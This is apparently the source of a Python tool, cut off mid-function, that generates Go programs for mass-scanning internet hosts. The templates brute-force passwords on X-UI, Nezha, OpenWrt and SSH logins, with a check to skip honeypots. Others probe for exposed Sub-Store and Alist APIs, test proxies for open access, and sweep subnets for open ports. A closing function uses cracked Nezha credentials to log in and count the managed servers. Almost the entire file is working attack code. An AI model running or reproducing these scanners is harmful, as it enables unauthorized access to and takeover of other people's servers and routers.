# -*- coding: utf-8 -*-
import os
import subprocess
import time
import shutil
import sys
import atexit
import re
import json
import base64
import binascii
import importlib.util
import uuid
import platform
from multiprocessing import Lock, Manager
from concurrent.futures import ProcessPoolExecutor, as_completed
# ==================== 依赖导入强化 (已修正) ====================
# 在脚本最开始就强制检查核心依赖，如果失败则直接退出
try:
    import psutil
    import requests
    import yaml
    import xlsxwriter
    from tqdm import tqdm
    from colorama import Fore, Style, init
    init(autoreset=True)
except ImportError as e:
    # --- 这是被修正的部分 ---
    # 在这里不能使用 Fore 或 Style，因为它们可能就是导入失败的对象
    print("❌ 错误：核心 Python 模块缺失！")
    print(f"缺失的模块是: {e.name}")
    print("请先手动安装所有依赖：")
    # 使用无颜色的 print
    print("python3 -m pip install psutil requests pyyaml xlsxwriter tqdm colorama --break-system-packages")
    sys.exit(1)

# 仅在非Windows系统上尝试导入
if platform.system() != "Windows":
    try:
        import resource
    except ImportError:
        resource = None
else:
    resource = None

try:
    import readline
except ImportError:
    pass
# =================================================

# ==================== 新增全局变量 ====================
TIMEOUT = 5
VERBOSE_DEBUG = False # 设置为True可以打印更详细的调试日志

# =========================== Go 模板 (已全面重构优化) ===========================
# 所有模板已切换到 fasthttp, stdin/stdout管道, channel+bufio.Writer, strings.Builder

# XUI/3x-ui 面板登录模板
XUI_GO_TEMPLATE_1_LINES = [
    "package main",
    "import (",
    "	\"bufio\"",
    "	\"crypto/tls\"",
    "	\"fmt\"",
    "	\"os\"",
    "	\"strings\"",
    "	\"sync\"",
    "	\"time\"",
    "	\"github.com/valyala/fasthttp\"",
    ")",
    "func worker(tasks <-chan string, wg *sync.WaitGroup, usernames []string, passwords []string, resultsChan chan<- string) {",
    "	defer wg.Done()",
    "	client := &fasthttp.Client{",
    "		TLSConfig: &tls.Config{InsecureSkipVerify: true},",
    "		NoDefaultUserAgentHeader: true, UserAgent: \"Mozilla/5.0\",",
    "		DisableKeepalive: {disable_keepalive},",
    "	}",
    "	for line := range tasks {",
    "		processIP(line, usernames, passwords, client, resultsChan)",
    "	}",
    "}",
    "func processIP(line string, usernames []string, passwords []string, client *fasthttp.Client, resultsChan chan<- string) {",
    "	ipPort := strings.TrimSpace(line)",
    "	if !strings.Contains(ipPort, \":\") { return }",
    "	var sb strings.Builder",
    "	for _, username := range usernames {",
    "		for _, password := range passwords {",
    "			sb.Reset()",
    "			sb.WriteString(\"username=\")",
    "			sb.WriteString(username)",
    "			sb.WriteString(\"&password=\")",
    "			sb.WriteString(password)",
    "			payload := sb.String()",
    "			if checkLogin(ipPort, payload, client, resultsChan) { return }",
    "		}",
    "	}",
    "}",
    "func checkLogin(ipPort, payload string, client *fasthttp.Client, resultsChan chan<- string) bool {",
    "	req := fasthttp.AcquireRequest()",
    "	resp := fasthttp.AcquireResponse()",
    "	defer fasthttp.ReleaseRequest(req)",
    "	defer fasthttp.ReleaseResponse(resp)",
    "	req.Header.SetMethod(\"POST\")",
    "	req.Header.SetContentType(\"application/x-www-form-urlencoded\")",
    "	req.SetBodyString(payload)",
    "	timeoutDuration := {timeout} * time.Second",
    "	// 尝试 http",
    "	req.SetRequestURI(\"http://\" + ipPort + \"/login\")",
    "	if client.DoTimeout(req, resp, timeoutDuration) == nil && resp.StatusCode() == fasthttp.StatusOK {",
    "		if strings.Contains(string(resp.Body()), `\"success\":true`) {",
    "			parts := strings.SplitN(payload, \"&\", 2)",
    "			user := strings.SplitN(parts[0], \"=\", 2)[1]",
    "			pass := strings.SplitN(parts[1], \"=\", 2)[1]",
    "			resultsChan <- fmt.Sprintf(\"%s %s %s\", ipPort, user, pass)",
    "			return true",
    "		}",
    "	}",
    "	// 尝试 https",
    "	req.SetRequestURI(\"https://\" + ipPort + \"/login\")",
    "	if client.DoTimeout(req, resp, timeoutDuration) == nil && resp.StatusCode() == fasthttp.StatusOK {",
    "		if strings.Contains(string(resp.Body()), `\"success\":true`) {",
    "			parts := strings.SplitN(payload, \"&\", 2)",
    "			user := strings.SplitN(parts[0], \"=\", 2)[1]",
    "			pass := strings.SplitN(parts[1], \"=\", 2)[1]",
    "			resultsChan <- fmt.Sprintf(\"%s %s %s\", ipPort, user, pass)",
    "			return true",
    "		}",
    "	}",
    "	return false",
    "}",
    "func main() {",
    "	resultsChan := make(chan string, 1024)",
    "	var writerWg sync.WaitGroup",
    "	writerWg.Add(1)",
    "	go func() {",
    "		defer writerWg.Done()",
    "		writer := bufio.NewWriter(os.Stdout)",
    "		for result := range resultsChan {",
    "			writer.WriteString(result + \"\\n\")",
    "		}",
    "		writer.Flush()",
    "	}()",
    "	usernames, passwords := {user_list}, {pass_list}",
    "	tasks := make(chan string, {semaphore_size})",
    "	var wg sync.WaitGroup",
    "	for i := 0; i < {semaphore_size}; i++ {",
    "		wg.Add(1)",
    "		go worker(tasks, &wg, usernames, passwords, resultsChan)",
    "	}",
    "	scanner := bufio.NewScanner(os.Stdin)",
    "	for scanner.Scan() {",
    "		line := strings.TrimSpace(scanner.Text())",
    "		if line != \"\" { tasks <- line }",
    "	}",
    "	close(tasks)",
    "	wg.Wait()",
    "	close(resultsChan)",
    "	writerWg.Wait()",
    "}",
]

# 哪吒面板登录模板
XUI_GO_TEMPLATE_2_LINES = [
    "package main",
    "import (",
    "	\"bufio\"",
    "	\"crypto/tls\"",
    "	\"fmt\"",
    "	\"os\"",
    "	\"strings\"",
    "	\"sync\"",
    "	\"time\"",
    "	\"github.com/valyala/fasthttp\"",
    ")",
    "func worker(tasks <-chan string, wg *sync.WaitGroup, usernames []string, passwords []string, resultsChan chan<- string) {",
    "	defer wg.Done()",
    "	client := &fasthttp.Client{",
    "		TLSConfig: &tls.Config{InsecureSkipVerify: true},",
    "		NoDefaultUserAgentHeader: true, UserAgent: \"Mozilla/5.0\",",
    "		DisableKeepalive: {disable_keepalive},",
    "	}",
    "	for line := range tasks {",
    "		processIP(line, usernames, passwords, client, resultsChan)",
    "	}",
    "}",
    "func processIP(line string, usernames []string, passwords []string, client *fasthttp.Client, resultsChan chan<- string) {",
    "	ipPort := strings.TrimSpace(line)",
    "	if !strings.Contains(ipPort, \":\") { return }",
    "	var sb strings.Builder",
    "	for _, username := range usernames {",
    "		for _, password := range passwords {",
    "			sb.Reset()",
    "			sb.WriteString(`{\"username\":\"`)",
    "			sb.WriteString(username)",
    "			sb.WriteString(`\",\"password\":\"`)",
    "			sb.WriteString(password)",
    "			sb.WriteString(`\"}`)",
    "			payload := sb.String()",
    "			if checkLogin(ipPort, username, password, payload, client, resultsChan) { return }",
    "		}",
    "	}",
    "}",
    "func checkLogin(ipPort, username, password, payload string, client *fasthttp.Client, resultsChan chan<- string) bool {",
    "	req := fasthttp.AcquireRequest()",
    "	resp := fasthttp.AcquireResponse()",
    "	defer fasthttp.ReleaseRequest(req)",
    "	defer fasthttp.ReleaseResponse(resp)",
    "	req.Header.SetMethod(\"POST\")",
    "	req.Header.SetContentType(\"application/json\")",
    "	req.SetBodyString(payload)",
    "	timeoutDuration := {timeout} * time.Second",
    "	// 尝试 http",
    "	req.SetRequestURI(\"http://\" + ipPort + \"/api/v1/login\")",
    "	if client.DoTimeout(req, resp, timeoutDuration) == nil && resp.StatusCode() == fasthttp.StatusOK {",
    "		if strings.Contains(string(resp.Body()), `\"token\":`) {",
    "			resultsChan <- fmt.Sprintf(\"%s %s %s\", ipPort, username, password)",
    "			return true",
    "		}",
    "	}",
    "	// 尝试 https",
    "	req.SetRequestURI(\"https://\" + ipPort + \"/api/v1/login\")",
    "	if client.DoTimeout(req, resp, timeoutDuration) == nil && resp.StatusCode() == fasthttp.StatusOK {",
    "		if strings.Contains(string(resp.Body()), `\"token\":`) {",
    "			resultsChan <- fmt.Sprintf(\"%s %s %s\", ipPort, username, password)",
    "			return true",
    "		}",
    "	}",
    "	return false",
    "}",
    "func main() {",
    "	resultsChan := make(chan string, 1024)",
    "	var writerWg sync.WaitGroup",
    "	writerWg.Add(1)",
    "	go func() {",
    "		defer writerWg.Done()",
    "		writer := bufio.NewWriter(os.Stdout)",
    "		for result := range resultsChan {",
    "			writer.WriteString(result + \"\\n\")",
    "		}",
    "		writer.Flush()",
    "	}()",
    "	usernames, passwords := {user_list}, {pass_list}",
    "	tasks := make(chan string, {semaphore_size})",
    "	var wg sync.WaitGroup",
    "	for i := 0; i < {semaphore_size}; i++ {",
    "		wg.Add(1)",
    "		go worker(tasks, &wg, usernames, passwords, resultsChan)",
    "	}",
    "	scanner := bufio.NewScanner(os.Stdin)",
    "	for scanner.Scan() {",
    "		line := strings.TrimSpace(scanner.Text())",
    "		if line != \"\" { tasks <- line }",
    "	}",
    "	close(tasks)",
    "	wg.Wait()",
    "	close(resultsChan)",
    "	writerWg.Wait()",
    "}",
]

# SSH 登录模板
XUI_GO_TEMPLATE_6_LINES = [
    "package main",
    "import (",
    "	\"bufio\"",
    "	\"fmt\"",
    "	\"os\"",
    "	\"strings\"",
    "	\"sync\"",
    "	\"time\"",
    "	\"golang.org/x/crypto/ssh\"",
    ")",
    "func worker(tasks <-chan string, wg *sync.WaitGroup, usernames []string, passwords []string, resultsChan chan<- string) {",
    "	defer wg.Done()",
    "	for line := range tasks {",
    "		processIP(line, usernames, passwords, resultsChan)",
    "	}",
    "}",
    "func processIP(line string, usernames []string, passwords []string, resultsChan chan<- string) {",
    "	ipPort := strings.TrimSpace(line)",
    "	parts := strings.Split(ipPort, \":\")",
    "	if len(parts) != 2 { return }",
    "	ip, port := strings.TrimSpace(parts[0]), strings.TrimSpace(parts[1])",
    "	for _, username := range usernames {",
    "		for _, password := range passwords {",
    "			config := &ssh.ClientConfig{",
    "				User:            username,",
    "				Auth:            []ssh.AuthMethod{ssh.Password(password)},",
    "				HostKeyCallback: ssh.InsecureIgnoreHostKey(),",
    "				Timeout:         {timeout} * time.Second,",
    "			}",
    "			client, err := ssh.Dial(\"tcp\", ipPort, config)",
    "			if err == nil {",
    "				if !isLikelyHoneypot(client) {",
    "					resultsChan <- fmt.Sprintf(\"%s:%s %s %s\", ip, port, username, password)",
    "				}",
    "				client.Close()",
    "				return",
    "			}",
    "		}",
    "	}",
    "}",
    "func isLikelyHoneypot(client *ssh.Client) bool {",
    "	session, err := client.NewSession()",
    "	if err != nil { return true }",
    "	defer session.Close()",
    "	err = session.RequestPty(\"xterm\", 80, 40, ssh.TerminalModes{})",
    "	if err != nil { return true }",
    "	output, err := session.CombinedOutput(\"echo $((1+1))\")",
    "	if err != nil { return true }",
    "	return strings.TrimSpace(string(output)) != \"2\"",
    "}",
    "func main() {",
    "	resultsChan := make(chan string, 1024)",
    "	var writerWg sync.WaitGroup",
    "	writerWg.Add(1)",
    "	go func() {",
    "		defer writerWg.Done()",
    "		writer := bufio.NewWriter(os.Stdout)",
    "		for result := range resultsChan {",
    "			writer.WriteString(result + \"\\n\")",
    "		}",
    "		writer.Flush()",
    "	}()",
    "	usernames, passwords := {user_list}, {pass_list}",
    "	tasks := make(chan string, {semaphore_size})",
    "	var wg sync.WaitGroup",
    "	for i := 0; i < {semaphore_size}; i++ {",
    "		wg.Add(1)",
    "		go worker(tasks, &wg, usernames, passwords, resultsChan)",
    "	}",
    "	scanner := bufio.NewScanner(os.Stdin)",
    "	for scanner.Scan() {",
    "		line := strings.TrimSpace(scanner.Text())",
    "		if line != \"\" { tasks <- line }",
    "	}",
    "	close(tasks)",
    "	wg.Wait()",
    "	close(resultsChan)",
    "	writerWg.Wait()",
    "}",
]

# Sub Store 路径扫描模板
XUI_GO_TEMPLATE_7_LINES = [
    "package main",
    "import (",
    "	\"bufio\"",
    "	\"crypto/tls\"",
    "	\"fmt\"",
    "	\"os\"",
    "	\"strings\"",
    "	\"sync\"",
    "	\"time\"",
    "	\"github.com/valyala/fasthttp\"",
    ")",
    "func worker(tasks <-chan string, wg *sync.WaitGroup, paths []string, resultsChan chan<- string) {",
    "	defer wg.Done()",
    "	client := &fasthttp.Client{",
    "		TLSConfig: &tls.Config{InsecureSkipVerify: true},",
    "		NoDefaultUserAgentHeader: true, UserAgent: \"Mozilla/5.0\",",
    "		DisableKeepalive: true,",
    "	}",
    "	for line := range tasks {",
    "		processIP(line, paths, client, resultsChan)",
    "	}",
    "}",
    "func processIP(line string, paths []string, client *fasthttp.Client, resultsChan chan<- string) {",
    "	ipPort := strings.TrimSpace(line)",
    "	if !strings.Contains(ipPort, \":\") { return }",
    "	for _, path := range paths {",
    "		if tryPath(ipPort, path, client, resultsChan) { break }",
    "	}",
    "}",
    "func tryPath(ipPort, path string, client *fasthttp.Client, resultsChan chan<- string) bool {",
    "	cleanPath := strings.Trim(path, \"/\")",
    "	fullPath := cleanPath + \"/api/utils/env\"",
    "	timeoutDuration := {timeout} * time.Second",
    "	// 尝试 http",
    "	httpURL := \"http://\" + ipPort + \"/\" + fullPath",
    "	if statusCode, body, err := fasthttp.GetTimeout(nil, httpURL, timeoutDuration); err == nil && statusCode == fasthttp.StatusOK {",
    "		if strings.Contains(string(body), `{\"status\":\"success\",\"data\"`) {",
    "			resultsChan <- fmt.Sprintf(\"http://%s?api=http://%s/%s\", ipPort, ipPort, cleanPath)",
    "			return true",
    "		}",
    "	}",
    "	// 尝试 https",
    "	httpsURL := \"https://\" + ipPort + \"/\" + fullPath",
    "	if statusCode, body, err := fasthttp.GetTimeout(nil, httpsURL, timeoutDuration); err == nil && statusCode == fasthttp.StatusOK {",
    "		if strings.Contains(string(body), `{\"status\":\"success\",\"data\"`) {",
    "			resultsChan <- fmt.Sprintf(\"https://%s?api=https://%s/%s\", ipPort, ipPort, cleanPath)",
    "			return true",
    "		}",
    "	}",
    "	return false",
    "}",
    "func main() {",
    "	resultsChan := make(chan string, 1024)",
    "	var writerWg sync.WaitGroup",
    "	writerWg.Add(1)",
    "	go func() {",
    "		defer writerWg.Done()",
    "		writer := bufio.NewWriter(os.Stdout)",
    "		for result := range resultsChan {",
    "			writer.WriteString(result + \"\\n\")",
    "		}",
    "		writer.Flush()",
    "	}()",
    "	paths := {pass_list}",
    "	tasks := make(chan string, {semaphore_size})",
    "	var wg sync.WaitGroup",
    "	for i := 0; i < {semaphore_size}; i++ {",
    "		wg.Add(1)",
    "		go worker(tasks, &wg, paths, resultsChan)",
    "	}",
    "	scanner := bufio.NewScanner(os.Stdin)",
    "	for scanner.Scan() {",
    "		line := strings.TrimSpace(scanner.Text())",
    "		if line != \"\" { tasks <- line }",
    "	}",
    "	close(tasks)",
    "	wg.Wait()",
    "	close(resultsChan)",
    "	writerWg.Wait()",
    "}",
]

# OpenWrt/iStoreOS 登录模板
XUI_GO_TEMPLATE_8_LINES = [
    "package main",
    "import (",
    "	\"bufio\"",
    "	\"crypto/tls\"",
    "	\"fmt\"",
    "	\"os\"",
    "	\"strings\"",
    "	\"sync\"",
    "	\"time\"",
    "	\"github.com/valyala/fasthttp\"",
    ")",
    "func worker(tasks <-chan string, wg *sync.WaitGroup, usernames []string, passwords []string, resultsChan chan<- string) {",
    "	defer wg.Done()",
    "	client := &fasthttp.Client{",
    "		TLSConfig: &tls.Config{InsecureSkipVerify: true},",
    "		NoDefaultUserAgentHeader: true, UserAgent: \"Mozilla/5.0\",",
    "		DisableKeepalive: {disable_keepalive},",
    "	}",
    "	for line := range tasks {",
    "		processIP(line, usernames, passwords, client, resultsChan)",
    "	}",
    "}",
    "func processIP(line string, usernames []string, passwords []string, client *fasthttp.Client, resultsChan chan<- string) {",
    "	ipPort := strings.TrimSpace(line)",
    "	if !strings.Contains(ipPort, \":\") { return }",
    "	var sb strings.Builder",
    "	for _, username := range usernames {",
    "		for _, password := range passwords {",
    "			sb.Reset()",
    "			sb.WriteString(\"luci_username=\")",
    "			sb.WriteString(username)",
    "			sb.WriteString(\"&luci_password=\")",
    "			sb.WriteString(password)",
    "			payload := sb.String()",
    "			if checkLogin(\"http://\"+ipPort, username, password, payload, client, resultsChan) { return }",
    "			if checkLogin(\"https://\"+ipPort, username, password, payload, client, resultsChan) { return }",
    "		}",
    "	}",
    "}",
    "func checkLogin(baseURL, username, password, payload string, client *fasthttp.Client, resultsChan chan<- string) bool {",
    "	req := fasthttp.AcquireRequest()",
    "	resp := fasthttp.AcquireResponse()",
    "	defer fasthttp.ReleaseRequest(req)",
    "	defer fasthttp.ReleaseResponse(resp)",
    "	req.SetRequestURI(baseURL)",
    "	req.Header.SetMethod(\"POST\")",
    "	req.Header.SetContentType(\"application/x-www-form-urlencoded\")",
    "	req.Header.Set(\"Referer\", baseURL+\"/\")",
    "	req.SetBodyString(payload)",
    "	if client.DoTimeout(req, resp, {timeout}*time.Second) != nil { return false }",
    "	var foundCookie bool",
    "	resp.Header.VisitAllCookie(func(key, value []byte) {",
    "		if string(key) == \"sysauth_http\" && len(value) > 0 {",
    "			foundCookie = true",
    "		}",
    "	})",
    "	if foundCookie {",
    "		resultsChan <- fmt.Sprintf(\"%s %s %s\", baseURL, username, password)",
    "		return true",
    "	}",
    "	return false",
    "}",
    "func main() {",
    "	resultsChan := make(chan string, 1024)",
    "	var writerWg sync.WaitGroup",
    "	writerWg.Add(1)",
    "	go func() {",
    "		defer writerWg.Done()",
    "		writer := bufio.NewWriter(os.Stdout)",
    "		for result := range resultsChan {",
    "			writer.WriteString(result + \"\\n\")",
    "		}",
    "		writer.Flush()",
    "	}()",
    "	usernames, passwords := {user_list}, {pass_list}",
    "	tasks := make(chan string, {semaphore_size})",
    "	var wg sync.WaitGroup",
    "	for i := 0; i < {semaphore_size}; i++ {",
    "		wg.Add(1)",
    "		go worker(tasks, &wg, usernames, passwords, resultsChan)",
    "	}",
    "	scanner := bufio.NewScanner(os.Stdin)",
    "	for scanner.Scan() {",
    "		line := strings.TrimSpace(scanner.Text())",
    "		if line != \"\" { tasks <- line }",
    "	}",
    "	close(tasks)",
    "	wg.Wait()",
    "	close(resultsChan)",
    "	writerWg.Wait()",
    "}",
]

# 通用代理验证模板
PROXY_GO_TEMPLATE_LINES = [
    "package main",
    "import (",
    "	\"bufio\"",
    "	\"crypto/tls\"",
    "	\"fmt\"",
    "	\"net/url\"",
    "	\"os\"",
    "	\"strings\"",
    "	\"sync\"",
    "	\"time\"",
    "	\"github.com/valyala/fasthttp\"",
    "	\"github.com/valyala/fasthttp/fasthttpproxy\"",
    ")",
    "var (",
    "	proxyType = \"{proxy_type}\"",
    "	authMode  = {auth_mode}",
    "	testURL   = \"{test_url}\"",
    "	realIP    = \"\"",
    ")",
    "func getPublicIP(targetURL string) (string, error) {",
    "	req := fasthttp.AcquireRequest()",
    "	resp := fasthttp.AcquireResponse()",
    "	defer fasthttp.ReleaseRequest(req)",
    "	defer fasthttp.ReleaseResponse(resp)",
    "	req.SetRequestURI(targetURL)",
    "	req.Header.Set(\"User-Agent\", \"curl/7.79.1\")",
    "	err := fasthttp.DoTimeout(req, resp, 15*time.Second)",
    "	if err != nil { return \"\", err }",
    "	ipString := string(resp.Body())",
    "	if strings.Contains(ipString, \"当前 IP：\") {",
    "		parts := strings.Split(ipString, \"：\")",
    "		if len(parts) > 1 {",
    "			ipParts := strings.Split(parts[1], \" \")",
    "			return ipParts[0], nil",
    "		}",
    "	}",
    "	return strings.TrimSpace(ipString), nil",
    "}",
    "func worker(tasks <-chan string, wg *sync.WaitGroup, resultsChan chan<- string) {",
    "	defer wg.Done()",
    "	for proxyAddr := range tasks {",
    "		processProxy(proxyAddr, resultsChan)",
    "	}",
    "}",
    "func processProxy(proxyAddr string, resultsChan chan<- string) {",
    "	var found bool",
    "	check := func(user, pass string) {",
    "		if found { return }",
    "		if checkConnection(proxyAddr, user, pass) {",
    "			found = true",
    "			var result string",
    "			if user != \"\" {",
    "				result = fmt.Sprintf(\"%s://%s:%s@%s\", proxyType, url.QueryEscape(user), url.QueryEscape(pass), proxyAddr)",
    "			} else {",
    "				result = fmt.Sprintf(\"%s://%s\", proxyType, proxyAddr)",
    "			}",
    "			resultsChan <- result",
    "		}",
    "	}",
    "	switch authMode {",
    "	case 1:",
    "		check(\"\", \"\")",
    "	case 2:",
    "		usernames, passwords := {user_list}, {pass_list}",
    "		for _, user := range usernames {",
    "			for _, pass := range passwords {",
    "				if found { return }",
    "				check(user, pass)",
    "			}",
    "		}",
    "	case 3:",
    "		credentials := {creds_list}",
    "		for _, cred := range credentials {",
    "			if found { return }",
    "			parts := strings.SplitN(cred, \":\", 2)",
    "			if len(parts) == 2 { check(parts[0], parts[1]) }",
    "		}",
    "	}",
    "}",
    "func checkConnection(proxyAddr, user, pass string) bool {",
    "	client := &fasthttp.Client{",
    "		TLSConfig: &tls.Config{InsecureSkipVerify: true},",
    "		NoDefaultUserAgentHeader: true, UserAgent: \"Mozilla/5.0\",",
    "	}",
    "	switch proxyType {",
    "	case \"http\":",
    "		client.Dial = fasthttpproxy.NewHTTPProxyDialer(proxyAddr)",
    "	case \"https\":",
    "       // fasthttp does not support https proxy directly, this is a simplification",
    "		return false",
    "	case \"socks5\":",
    "		client.Dial = fasthttpproxy.NewSocks5ProxyDialer(proxyAddr, user, pass)",
    "	}",
    "	req := fasthttp.AcquireRequest()",
    "	resp := fasthttp.AcquireResponse()",
    "	defer fasthttp.ReleaseRequest(req)",
    "	defer fasthttp.ReleaseResponse(resp)",
    "	req.SetRequestURI(testURL)",
    "	if client.DoTimeout(req, resp, {timeout}*time.Second) != nil { return false }",
    "	proxyIP := string(resp.Body())",
    "	if strings.Contains(proxyIP, \"当前 IP：\") {",
    "		parts := strings.Split(proxyIP, \"：\")",
    "		if len(parts) > 1 { proxyIP = strings.Split(parts[1], \" \")[0] }",
    "	}",
    "	proxyIP = strings.TrimSpace(proxyIP)",
    "	if realIP == \"UNKNOWN\" || proxyIP == \"\" { return false }",
    "	return proxyIP != realIP",
    "}",
    "func main() {",
    "	var err error",
    "	realIP, err = getPublicIP(testURL)",
    "	if err != nil { realIP = \"UNKNOWN\" }",
    "	resultsChan := make(chan string, 1024)",
    "	var writerWg sync.WaitGroup",
    "	writerWg.Add(1)",
    "	go func() {",
    "		defer writerWg.Done()",
    "		writer := bufio.NewWriter(os.Stdout)",
    "		for result := range resultsChan {",
    "			writer.WriteString(result + \"\\n\")",
    "		}",
    "		writer.Flush()",
    "	}()",
    "	tasks := make(chan string, {semaphore_size})",
    "	var wg sync.WaitGroup",
    "	for i := 0; i < {semaphore_size}; i++ {",
    "		wg.Add(1)",
    "		go worker(tasks, &wg, resultsChan)",
    "	}",
    "	scanner := bufio.NewScanner(os.Stdin)",
    "	for scanner.Scan() {",
    "		line := strings.TrimSpace(scanner.Text())",
    "		if line != \"\" { tasks <- line }",
    "	}",
    "	close(tasks)",
    "	wg.Wait()",
    "	close(resultsChan)",
    "	writerWg.Wait()",
    "}",
]

# Alist 面板扫描模板
ALIST_GO_TEMPLATE_LINES = [
    "package main",
    "import (",
    "	\"bufio\"",
    "	\"crypto/tls\"",
    "	\"fmt\"",
    "	\"os\"",
    "	\"strings\"",
    "	\"sync\"",
    "	\"time\"",
    "	\"github.com/valyala/fasthttp\"",
    ")",
    "func worker(tasks <-chan string, wg *sync.WaitGroup, resultsChan chan<- string) {",
    "	defer wg.Done()",
    "	client := &fasthttp.Client{",
    "		TLSConfig: &tls.Config{InsecureSkipVerify: true},",
    "		NoDefaultUserAgentHeader: true, UserAgent: \"Mozilla/5.0\",",
    "		DisableKeepalive: true,",
    "	}",
    "	for ipPort := range tasks {",
    "		processIP(ipPort, client, resultsChan)",
    "	}",
    "}",
    "func processIP(ipPort string, client *fasthttp.Client, resultsChan chan<- string) {",
    "	if !strings.Contains(ipPort, \":\") { return }",
    "	for _, proto := range []string{\"http\", \"https\"} {",
    "		url := fmt.Sprintf(\"%s://%s/api/me\", proto, ipPort)",
    "		req := fasthttp.AcquireRequest()",
    "		resp := fasthttp.AcquireResponse()",
    "		req.SetRequestURI(url)",
    "		err := client.DoTimeout(req, resp, {timeout}*time.Second)",
    "		if err == nil && resp.StatusCode() == fasthttp.StatusOK {",
    "			body := string(resp.Body())",
    "			if strings.Contains(body, `\"code\":200`) {",
    "				resultsChan <- fmt.Sprintf(\"%s://%s\", proto, ipPort)",
    "				fasthttp.ReleaseRequest(req)",
    "				fasthttp.ReleaseResponse(resp)",
    "				return",
    "			}",
    "		}",
    "		fasthttp.ReleaseRequest(req)",
    "		fasthttp.ReleaseResponse(resp)",
    "	}",
    "}",
    "func main() {",
    "	resultsChan := make(chan string, 1024)",
    "	var writerWg sync.WaitGroup",
    "	writerWg.Add(1)",
    "	go func() {",
    "		defer writerWg.Done()",
    "		writer := bufio.NewWriter(os.Stdout)",
    "		for result := range resultsChan {",
    "			writer.WriteString(result + \"\\n\")",
    "		}",
    "		writer.Flush()",
    "	}()",
    "	tasks := make(chan string, {semaphore_size})",
    "	var wg sync.WaitGroup",
    "	for i := 0; i < {semaphore_size}; i++ {",
    "		wg.Add(1)",
    "		go worker(tasks, &wg, resultsChan)",
    "	}",
    "	scanner := bufio.NewScanner(os.Stdin)",
    "	for scanner.Scan() {",
    "		line := strings.TrimSpace(scanner.Text())",
    "		if line != \"\" {",
    "			fields := strings.Fields(line)",
    "			if len(fields) > 0 { tasks <- fields[0] }",
    "		}",
    "	}",
    "	close(tasks)",
    "	wg.Wait()",
    "	close(resultsChan)",
    "	writerWg.Wait()",
    "}",
]

# TCP 端口活性测试模板
TCP_ACTIVE_GO_TEMPLATE_LINES = [
    "package main",
    "import (",
    "	\"bufio\"",
    "	\"net\"",
    "	\"os\"",
    "	\"strings\"",
    "	\"sync\"",
    "	\"time\"",
    ")",
    "func worker(tasks <-chan string, wg *sync.WaitGroup, resultsChan chan<- string) {",
    "	defer wg.Done()",
    "	for ipPort := range tasks {",
    "		conn, err := net.DialTimeout(\"tcp\", strings.TrimSpace(ipPort), {timeout}*time.Second)",
    "		if err == nil {",
    "			conn.Close()",
    "			resultsChan <- ipPort",
    "		}",
    "	}",
    "}",
    "func main() {",
    "	resultsChan := make(chan string, 1024)",
    "	var writerWg sync.WaitGroup",
    "	writerWg.Add(1)",
    "	go func() {",
    "		defer writerWg.Done()",
    "		writer := bufio.NewWriter(os.Stdout)",
    "		for result := range resultsChan {",
    "			writer.WriteString(result + \"\\n\")",
    "		}",
    "		writer.Flush()",
    "	}()",
    "	tasks := make(chan string, {semaphore_size})",
    "	var wg sync.WaitGroup",
    "	for i := 0; i < {semaphore_size}; i++ {",
    "		wg.Add(1)",
    "		go worker(tasks, &wg, resultsChan)",
    "	}",
    "	scanner := bufio.NewScanner(os.Stdin)",
    "	for scanner.Scan() {",
    "		line := strings.TrimSpace(scanner.Text())",
    "		if line != \"\" { tasks <- line }",
    "	}",
    "	close(tasks)",
    "	wg.Wait()",
    "	close(resultsChan)",
    "	writerWg.Wait()",
    "}",
]

# 子网TCP扫描模板
SUBNET_TCP_SCANNER_GO_TEMPLATE_LINES = [
    "package main",
    "import (",
    "	\"bufio\"",
    "	\"fmt\"",
    "	\"net\"",
    "	\"os\"",
    "	\"strconv\"",
    "	\"sync\"",
    "	\"time\"",
    ")",
    "func inc(ip net.IP) {",
    "	for j := len(ip) - 1; j >= 0; j-- {",
    "		ip[j]++",
    "		if ip[j] > 0 { break }",
    "	}",
    "}",
    "func worker(tasks <-chan net.IP, port string, wg *sync.WaitGroup, resultsChan chan<- string) {",
    "	defer wg.Done()",
    "	timeout := 3 * time.Second",
    "	for ip := range tasks {",
    "		target := net.JoinHostPort(ip.String(), port)",
    "		conn, err := net.DialTimeout(\"tcp\", target, timeout)",
    "		if err == nil {",
    "			conn.Close()",
    "			resultsChan <- target",
    "		}",
    "	}",
    "}",
    "func main() {",
    "	if len(os.Args) < 4 { os.Exit(1) }",
    "	cidr, port, concurrencyStr := os.Args[1], os.Args[2], os.Args[3]",
    "	concurrency, _ := strconv.Atoi(concurrencyStr)",
    "	resultsChan := make(chan string, 1024)",
    "	var writerWg sync.WaitGroup",
    "	writerWg.Add(1)",
    "	go func() {",
    "		defer writerWg.Done()",
    "		writer := bufio.NewWriter(os.Stdout)",
    "		for result := range resultsChan {",
    "			writer.WriteString(result + \"\\n\")",
    "		}",
    "		writer.Flush()",
    "	}()",
    "	ip, ipnet, err := net.ParseCIDR(cidr)",
    "	if err != nil { os.Exit(1) }",
    "	tasks := make(chan net.IP, concurrency)",
    "	var wg sync.WaitGroup",
    "	for i := 0; i < concurrency; i++ {",
    "		wg.Add(1)",
    "		go worker(tasks, port, &wg, resultsChan)",
    "	}",
    "	for ip := ip.Mask(ipnet.Mask); ipnet.Contains(ip); inc(ip) {",
    "		ipCopy := make(net.IP, len(ip))",
    "		copy(ipCopy, ip)",
    "		tasks <- ipCopy",
    "	}",
    "	close(tasks)",
    "	wg.Wait()",
    "	close(resultsChan)",
    "	writerWg.Wait()",
    "}",
]

# =========================== ipcx.py 内容 (已废弃，功能内联到主脚本) ===========================
# IPCX_PY_CONTENT is no longer needed as its functionality is now integrated.

# =========================== 哪吒面板分析函数 ===========================
def analyze_panel(result_line):
    parts = result_line.split()
    if len(parts) < 3: return result_line, (0, 0, "格式错误")
    ip_port, username, password = parts[0], parts[1], parts[2]
    for protocol in ["http", "https"]:
        base_url = f"{protocol}://{ip_port}"
        session = requests.Session()
        login_url = f"{base_url}/api/v1/login"
        payload = {"username": username, "password": password}
        try:
            requests.packages.urllib3.disable_warnings()
            res = session.post(login_url, json=payload, timeout=TIMEOUT, verify=False)
            if res.status_code == 200:
                try:
                    j = res.json()
                    if "token" in j.get("data", {}):
                        session.headers.update({"Authorization": f"Bearer {j['data']['token']}"})
                        res_server = session.get(f"{base_url}/api/v1/server", timeout=TIMEOUT, verify=False)
                        if res_server.status_code == 200:
                            server_data = res_server.json().get("data", [])
                            machine_count = len(server_data) if server_data else 0
                            return result_line, (machine_count, "N/A", "N/A") # 简化分析，不再检查终端
                except (json.JSONDecodeError, requests.RequestException):
                    continue
